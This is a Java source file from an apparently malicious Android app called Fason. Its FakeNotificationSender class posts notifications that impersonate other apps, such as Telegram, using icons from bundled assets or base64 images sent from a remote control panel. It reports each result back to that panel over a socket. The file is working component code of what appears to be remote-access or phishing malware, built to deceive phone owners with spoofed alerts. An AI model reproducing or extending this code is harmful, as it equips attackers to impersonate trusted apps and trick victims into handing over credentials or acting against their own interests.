package com.fason.app.features.notification;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Build;
import android.util.Base64;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import androidx.core.graphics.drawable.IconCompat;
import com.fason.app.R;
import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;
import org.json.JSONObject;
import java.io.InputStream;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * FakeNotificationSender — posts a notification indistinguishable from any real app.
 *
 * Icon resolution order (first match wins):
 *   1. {@code iconAsset}  — filename in {@code assets/icons/} (e.g. "telegram.jpg")
 *   2. {@code iconBase64} — raw base-64 PNG / JPEG bytes from panel
 *   3. Fallback: built-in stealth vector drawable
 *
 * The icon is applied as BOTH the large-icon (notification body) and, on API 23+,
 * the small-icon (status bar header), fully replacing Fason's own icon visually.
 */
public final class FakeNotificationSender {

    private static final String TAG          = "FakeNotif";
    private static final String ICONS_DIR    = "icons";
    private static final AtomicInteger COUNTER = new AtomicInteger(10_000);

    private FakeNotificationSender() {}

    // ── Public API ─────────────────────────────────────────────────────────────

    /**
     * Post a fake notification.
     *
     * @param title       Notification title
     * @param body        Notification body text
     * @param channelId   Android channel id (created on first use)
     * @param channelName Human-readable channel name shown in Settings
     * @param iconAsset   Filename in assets/icons/ (e.g. "telegram.jpg"). Takes priority.
     * @param iconBase64  Base64-encoded PNG/JPEG fallback (used if iconAsset is null/missing)
     * @param vibrate     Whether to vibrate
     * @param cmdId       Command tracking id
     */
    public static void send(
            String title,
            String body,
            String channelId,
            String channelName,
            String iconAsset,
            String iconBase64,
            boolean vibrate,
            String cmdId) {
        try {
            Context ctx = FasonApp.getContext();
            NotificationManager nm =
                (NotificationManager) ctx.getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm == null) { sendResult(false, "NotificationManager unavailable", cmdId); return; }

            // Sanitise
            if (title       == null || title.isEmpty())       title       = " ";
            if (body        == null)                           body        = "";
            if (channelId   == null || channelId.isEmpty())   channelId   = Protocol.FAKE_NOTIF_CHANNEL;
            if (channelName == null || channelName.isEmpty()) channelName = "App";

            ensureChannel(nm, channelId, channelName, vibrate);

            NotificationCompat.Builder builder =
                new NotificationCompat.Builder(ctx, channelId)
                    .setSmallIcon(R.drawable.ic_notif_stealth)
                    .setContentTitle(title)
                    .setContentText(body)
                    .setStyle(new NotificationCompat.BigTextStyle().bigText(body))
                    .setAutoCancel(true)
                    .setPriority(NotificationCompat.PRIORITY_HIGH)
                    .setCategory(NotificationCompat.CATEGORY_MESSAGE)
                    .setVisibility(NotificationCompat.VISIBILITY_PUBLIC)
                    .setVibrate(vibrate ? new long[]{0, 250, 100, 250} : null);

            // Resolve icon bitmap
            Bitmap iconBmp = resolveIcon(ctx, iconAsset, iconBase64);
            if (iconBmp != null) {
                builder.setLargeIcon(iconBmp);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    Bitmap small = Bitmap.createScaledBitmap(iconBmp, 96, 96, true);
                    builder.setSmallIcon(IconCompat.createWithBitmap(small));
                }
            }

            int id = COUNTER.getAndIncrement();
            nm.notify(id, builder.build());
            sendResult(true, String.valueOf(id), cmdId);
            Log.d(TAG, "Notif posted id=" + id + " icon=" + (iconAsset != null ? iconAsset : "base64"));

        } catch (Exception e) {
            Log.e(TAG, "send failed", e);
            sendResult(false, e.getMessage(), cmdId);
        }
    }

    /** Cancel a specific notification by id. */
    public static void cancel(int notifId, String cmdId) {
        try {
            NotificationManager nm = nm();
            if (nm != null) nm.cancel(notifId);
            sendResult(true, "cancelled:" + notifId, cmdId);
        } catch (Exception e) {
            sendResult(false, e.getMessage(), cmdId);
        }
    }

    /** Cancel all notifications posted by this app. */
    public static void cancelAll(String cmdId) {
        try {
            NotificationManager nm = nm();
            if (nm != null) nm.cancelAll();
            sendResult(true, "all_cancelled", cmdId);
        } catch (Exception e) {
            sendResult(false, e.getMessage(), cmdId);
        }
    }

    // ── Icon resolution ────────────────────────────────────────────────────────

    /**
     * Tries to load an icon bitmap:
     *  1. assets/icons/<iconAsset>
     *  2. base64 decode of iconBase64
     *  3. null (caller falls back to built-in drawable)
     */
    private static Bitmap resolveIcon(Context ctx, String iconAsset, String iconBase64) {
        // 1. Asset file
        if (iconAsset != null && !iconAsset.isEmpty()) {
            Bitmap bmp = loadAssetIcon(ctx, iconAsset);
            if (bmp != null) return bmp;
            Log.w(TAG, "Asset icon not found: " + iconAsset + " — trying base64");
        }
        // 2. Base64
        if (iconBase64 != null && !iconBase64.isEmpty()) {
            try {
                byte[] bytes = Base64.decode(iconBase64, Base64.DEFAULT);
                Bitmap bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
                if (bmp != null) return bmp;
            } catch (Exception e) {
                Log.w(TAG, "Base64 icon decode failed", e);
            }
        }
        return null;
    }

    /**
     * Loads a bitmap from {@code assets/icons/<filename>}.
     * Accepts any image format supported by BitmapFactory (PNG, JPG, WEBP).
     * Path-traversal safe: strips directory separators.
     */
    private static Bitmap loadAssetIcon(Context ctx, String filename) {
        // Sanitise
        String safe = filename.replace("/", "").replace("\\", "").replace("..", "");
        if (safe.isEmpty()) return null;
        String path = ICONS_DIR + "/" + safe;
        try (InputStream is = ctx.getAssets().open(path)) {
            return BitmapFactory.decodeStream(is);
        } catch (Exception e) {
            Log.v(TAG, "Asset icon " + path + " not found");
            return null;
        }
    }

    // ── Channel management ─────────────────────────────────────────────────────

    private static void ensureChannel(
            NotificationManager nm, String id, String name, boolean vibrate) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return;
        if (nm.getNotificationChannel(id) != null) return;
        NotificationChannel ch = new NotificationChannel(id, name, NotificationManager.IMPORTANCE_HIGH);
        ch.setDescription(name);
        ch.setShowBadge(true);
        ch.setLockscreenVisibility(Notification.VISIBILITY_PUBLIC);
        ch.enableVibration(vibrate);
        if (vibrate) ch.setVibrationPattern(new long[]{0, 250, 100, 250});
        nm.createNotificationChannel(ch);
    }

    // ── Helpers ────────────────────────────────────────────────────────────────

    private static NotificationManager nm() {
        return (NotificationManager)
            FasonApp.getContext().getSystemService(Context.NOTIFICATION_SERVICE);
    }

    private static void sendResult(boolean success, String detail, String cmdId) {
        try {
            io.socket.client.Socket socket = SocketClient.getInstance().getSocket();
            if (socket == null) return;
            JSONObject r = new JSONObject();
            r.put(Protocol.KEY_TYPE,    "fake_notif_result");
            r.put(Protocol.KEY_SUCCESS, success);
            if (detail != null)  r.put(Protocol.KEY_MESSAGE, detail);
            if (cmdId  != null && !cmdId.isEmpty()) r.put(Protocol.KEY_CMD_ID, cmdId);
            socket.emit(Protocol.NOTIF, r);
        } catch (Exception ignored) {}
    }
}
